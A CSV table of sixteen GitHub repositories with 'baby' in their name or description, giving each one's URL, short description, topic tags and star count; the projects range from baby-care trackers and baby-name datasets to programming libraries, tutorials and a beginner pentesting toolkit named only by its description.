,Url,Description,Topics,Stars
0,https://github.com/cnodejs/nodeclub.git,:baby_chick:Nodeclub 是使用 Node.js 和 MongoDB 开发的社区系统,,9062
1,https://github.com/coolnameismy/BabyBluetooth.git,":baby: The easiest way to use Bluetooth (BLE )in ios/os ,even bady can use . 一个非常容易使用的蓝牙库,适用于ios和os",,4465
2,https://github.com/babybuddy/babybuddy.git,"{""A :baby: buddy to help caregivers track sleep, feedings, diaper changes, and tummy time to learn about and predict baby's needs without (as much) guess work.""}","baby,parents,tracker,self-hosted,python,django,dashboard,parenting",1046
3,https://github.com/M4cs/BabySploit.git,:baby: BabySploit Beginner Pentesting Toolkit/Framework Written in Python :snake:,"pentesting,pentest-tool,python3,beginner,beginner-friendly,tools,ethical-hacking,penetration-testing,penetration-testing-framework,kali,toolkit",885
4,https://github.com/PhantomInsights/baby-names-analysis.git,"{""Data ETL & Analysis on the dataset 'Baby Names from Social Security Card Applications - National Data'.""}","python3,matplotlib,pandas,numpy,seaborn,eda,etl,python-requests",556
5,https://github.com/TimeMagazineLabs/babynames.git,"{""Fun with the Social Security Administration's baby name data""}",,507
6,https://github.com/jiasenlu/NeuralBabyTalk.git,"Pytorch code of for our CVPR 2018 paper ""Neural Baby Talk""",,491
7,https://github.com/memetic-institute/Money-printer-go-BRRR.git,"Print it, baby!","federal-reserve,memes,nextjs",348
8,https://github.com/quack/quack.git,:baby_chick: A multi-paradigm programming language with gradual and duck typing that targets PHP and JS,"programming-language,language,programming-paradigms,repl,functional-programming",312
9,https://github.com/qingmei2/RxWeaver.git,:baby_chick: 一种基于RxJava2实现全局Error处理的实现方式。,,267
10,https://github.com/panacloud-modern-global-apps/learn-typescript.git,Learning TypeScript in Baby Steps,"typescript,learning-typescript",252
11,https://github.com/marvindanig/ABCD-Animal-Book.git,"{"":baby: Superbook: ABC's for babies!""}","bookiza,babies,alphabets,book",236
12,https://github.com/nixzhu/Baby.git,"Create models from a JSON file, even a Baby can do it.","code-generator,swift,model,parser,parser-combinators,json",214
13,https://github.com/panacloud/learn-angular.git,Learn Angular 4 in Baby Steps,,202
14,https://github.com/basho/cuttlefish.git," never lose your childlike sense of wonder baby cuttlefish, promise me?",,195
15,https://github.com/hadley/data-baby-names.git,"Distribution of US baby names, 1880-2008",,181
